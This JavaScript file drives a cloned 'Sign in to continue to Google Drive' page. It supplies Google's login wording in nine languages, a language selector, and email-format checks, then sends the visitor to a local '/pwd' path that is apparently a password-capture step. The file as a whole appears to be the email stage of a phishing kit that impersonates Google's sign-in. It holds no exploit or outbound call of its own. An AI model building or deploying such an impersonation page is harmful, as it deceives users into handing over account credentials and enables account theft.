document.addEventListener("DOMContentLoaded", function () {
    const translations = {
        en: {
            headerText: "Sign in",
            subtitleText: "to continue to Google Drive",
            emailLabel: "Email or phone",
            forgotLink: "Forgot email?",
            footerText:
                "Not your computer? Use Guest mode to sign in privately.",
            learnMoreLink: "Learn more about using Guest mode",
            createAccount: "Create account",
            nextButton: "Next",
            helpLink: "Help",
            privacyLink: "Privacy",
            termsLink: "Terms",
        },
        "en-uk": {
            headerText: "Sign in",
            subtitleText: "to continue to Google Drive",
            emailLabel: "Email or phone",
            forgotLink: "Forgot email?",
            footerText:
                "Not your computer? Use Guest mode to sign in privately.",
            learnMoreLink: "Learn more about using Guest mode",
            createAccount: "Create account",
            nextButton: "Next",
            helpLink: "Help",
            privacyLink: "Privacy",
            termsLink: "Terms",
        },
        de: {
            headerText: "Anmelden",
            subtitleText: "um fortzufahren zu Google Drive",
            emailLabel: "E-Mail oder Telefon",
            forgotLink: "E-Mail vergessen?",
            footerText:
                "Nicht Ihr Computer? Nutzen Sie den Gastmodus, um sich privat anzumelden.",
            learnMoreLink: "Erfahren Sie mehr über den Gastmodus",
            createAccount: "Konto erstellen",
            nextButton: "Weiter",
            helpLink: "Hilfe",
            privacyLink: "Datenschutz",
            termsLink: "Nutzungsbedingungen",
        },
        "es-es": {
            headerText: "Iniciar sesión",
            subtitleText: "para continuar a Google Drive",
            emailLabel: "Correo electrónico o teléfono",
            forgotLink: "¿Olvidaste tu correo electrónico?",
            footerText:
                "¿No es tu computadora? Usa el modo de invitado para acceder de forma privada.",
            learnMoreLink: "Obtén más información sobre el modo de invitado",
            createAccount: "Crear cuenta",
            nextButton: "Siguiente",
            helpLink: "Ayuda",
            privacyLink: "Privacidad",
            termsLink: "Términos",
        },
        "es-la": {
            headerText: "Iniciar sesión",
            subtitleText: "para continuar a Google Drive",
            emailLabel: "Correo electrónico o teléfono",
            forgotLink: "¿Olvidaste tu correo electrónico?",
            footerText:
                "¿No es tu computadora? Usa el modo de invitado para acceder de forma privada.",
            learnMoreLink: "Obtén más información sobre el modo de invitado",
            createAccount: "Crear cuenta",
            nextButton: "Siguiente",
            helpLink: "Ayuda",
            privacyLink: "Privacidad",
            termsLink: "Términos",
        },
        et: {
            headerText: "Logi sisse",
            subtitleText: "jätkamiseks Google Drive'iga",
            emailLabel: "E-post või telefon",
            forgotLink: "Unustasid e-posti?",
            footerText:
                "Kas see pole sinu arvuti? Kasuta privaatseks sisselogimiseks külalisrežiimi.",
            learnMoreLink: "Lisateave külalisrežiimi kohta",
            createAccount: "Loo konto",
            nextButton: "Järgmine",
            helpLink: "Abi",
            privacyLink: "Privaatsus",
            termsLink: "Tingimused",
        },
        fil: {
            headerText: "Mag-sign in",
            subtitleText: "para magpatuloy sa Google Drive",
            emailLabel: "Email o telepono",
            forgotLink: "Nakalimutan ang email?",
            footerText:
                "Hindi mo gamit ang iyong computer? Gamitin ang Guest mode para mag-sign in nang pribado.",
            learnMoreLink: "Alamin pa ang tungkol sa Guest mode",
            createAccount: "Gumawa ng account",
            nextButton: "Susunod",
            helpLink: "Tulong",
            privacyLink: "Privacy",
            termsLink: "Mga Tuntunin",
        },
        "fr-ca": {
            headerText: "Se connecter",
            subtitleText: "pour continuer vers Google Drive",
            emailLabel: "E-mail ou téléphone",
            forgotLink: "Adresse e-mail oubliée ?",
            footerText:
                "Vous n'utilisez pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.",
            learnMoreLink: "En savoir plus sur le mode Invité",
            createAccount: "Créer un compte",
            nextButton: "Suivant",
            helpLink: "Aide",
            privacyLink: "Confidentialité",
            termsLink: "Conditions",
        },
        id: {
            headerText: "Masuk",
            subtitleText: "untuk melanjutkan ke Google Drive",
            emailLabel: "Email atau telepon",
            forgotLink: "Lupa email?",
            footerText:
                "Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi.",
            learnMoreLink: "Pelajari lebih lanjut tentang mode Tamu",
            createAccount: "Buat akun",
            nextButton: "Berikutnya",
            helpLink: "Bantuan",
            privacyLink: "Privasi",
            termsLink: "Persyaratan",
        },
    };

    const updateLanguage = (lang) => {
        const translation = translations[lang];
        if (translation) {
            document.querySelector(".login-header").textContent =
                translation.headerText;
            document.querySelector(".login-subtitle").textContent =
                translation.subtitleText;
            document.querySelector(".floating-label").textContent =
                translation.emailLabel;
            document.querySelector(".forgot-link").textContent =
                translation.forgotLink;
            document.querySelector(".footer-text").childNodes[0].textContent =
                translation.footerText;
            document.querySelector(".footer-text a").textContent =
                translation.learnMoreLink;
            document.querySelector(".create-link").textContent =
                translation.createAccount;
            document.querySelector(".next-button").textContent =
                translation.nextButton;
            const footerLinks = document.querySelectorAll(".TNC a");
            footerLinks[0].textContent = translation.helpLink;
            footerLinks[1].textContent = translation.privacyLink;
            footerLinks[2].textContent = translation.termsLink;
        }
    };

    const dropdownButton = document.getElementById("languageDropdown");
    const dropdownMenu = document.getElementById("dropdownMenu");
    const dropdownArrow = document.getElementById("dropdownArrow");

    dropdownButton.addEventListener("click", () => {
        dropdownMenu.classList.toggle("show");
        dropdownArrow.classList.toggle("up");
    });

    const dropdownItems = dropdownMenu.querySelectorAll(".dropdown-item");
    dropdownItems.forEach((item) => {
        item.addEventListener("click", (event) => {
            dropdownItems.forEach((i) => i.classList.remove("selected"));
            event.target.classList.add("selected");
            const selectedLang = event.target.getAttribute("data-lang");
            dropdownButton.childNodes[0].textContent = event.target.textContent;
            updateLanguage(selectedLang);
            dropdownMenu.classList.remove("show");
            dropdownArrow.classList.remove("up");
        });
    });

    document.addEventListener("click", (event) => {
        if (
            !dropdownButton.contains(event.target) &&
            !dropdownMenu.contains(event.target)
        ) {
            dropdownMenu.classList.remove("show");
            dropdownArrow.classList.remove("up");
        }
    });

    const emailInput = document.getElementById("email");
    const nextButton = document.querySelector(".next-button");
    const errorText = document.getElementById("error-text");
    const loginContainer = document.querySelector(".login-container");
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const invalidCharRegex = /["'<>&]/;

    function htmlspecialchars(str) {
        return str
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    nextButton.addEventListener("click", () => {
        const sanitizedEmail = htmlspecialchars(emailInput.value.trim());
        if (emailInput.value.trim() === "") {
            errorText.style.display = "block";
            errorText.textContent = "Please enter your email.";
            emailInput.focus();

            loginContainer.style.height = "455px";
        } else if (invalidCharRegex.test(emailInput.value.trim())) {
            errorText.style.display = "block";
            errorText.textContent = "Please enter a valid email address.";
            emailInput.focus();

            loginContainer.style.height = "455px";
        } else if (!emailRegex.test(emailInput.value.trim())) {
            errorText.style.display = "block";
            errorText.textContent = "Please enter a valid email address.";
            emailInput.focus();

            loginContainer.style.height = "455px";
        } else {
            errorText.style.display = "none";
            loginContainer.style.height = "425px";
            window.location.href = "/pwd";
        }
    });

    emailInput.addEventListener("input", () => {
        if (emailInput.value.trim() !== "") {
            errorText.style.display = "none";

            loginContainer.style.height = "425px";
        }
    });
});
